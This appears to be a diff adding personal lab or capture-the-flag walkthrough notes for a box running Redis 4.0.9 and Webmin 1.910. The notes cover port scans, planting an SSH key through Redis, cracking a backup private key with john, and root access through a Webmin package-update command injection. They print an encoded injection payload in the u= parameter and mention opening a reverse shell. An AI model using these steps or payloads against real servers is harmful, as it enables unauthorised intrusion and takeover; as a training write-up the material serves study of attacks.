@@ -1,0 +1,60 @@
+---PORT SCAN---
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---GOBUSTER---
+:80/ (medium.txt):
+  /images (Status: 301)
+  /upload (Status: 301)
+  /css (Status: 301)
+  /js (Status: 301)
+  /fonts (Status: 301)
+  /server-status (Status: 403)
+
+---ATTEMPTS---
+redis 4.x has a vulnerability that leads to uRCE (https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf) (https://github.com/Ridter/redis-rce)
+Every Redis Cluster node has an additional TCP port for receiving incoming connections from other Redis Cluster nodes. This port is at a fixed offset (+10000) from the normal TCP port used to receive incoming connections from clients 
+using this exploit https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py
+with a little modification to use the user path as /var/lib/redis/ which was discovered using 'config get dir' command.
+to check if this user has a .ssh: config set dir /var/lib/redis/.ssh
+kudos!
+
+in website:10000:
+  This web server is running in SSL mode. Try the URL https://Postman:10000/ instead.
+adding to hosts
+Webmin page returned
+
+---PRIVESC---
+script run at: 2020/09/22 15:39:01
+[+] Searching ssl/ssh files
+  /usr/src/linux-headers-4.15.0-58/scripts/config /opt/id_rsa.bak
+-rwxr-xr-x 1 Matt Matt 1.8K Aug 26  2019 /opt/id_rsa.bak
+using john to decript
+  computer2008     (id_rsa.bak)
+done!
+cat /home/Matt/user.txt
+nothing on linpeas
+trying to login into webmin with Matt/computer2008
+done!
+using https://github.com/KrE80r/webmin_cve-2019-12840_poc exploit with a whoami command:
+  root
+executing a rshell
+kudos!
+cat /root/root.txt
+When using the update-pagackes from the webmin, it sends as post request a giant apt command with the names of every package to be updated, this is obviously wrong. just as a PoC, if a $(whoami) packages is inside this big command, it will try to update the `root` package and will fail. As easy as it is, just create a $(BASH REVERSE SHELL) and boom, root done
+sending:
+  u=acl/apt&u=;$(echo${IFS}d2hvYW1pCg==|base64${IFS}-d|bash):
+    sh: 1: root: not found
+it executed the command
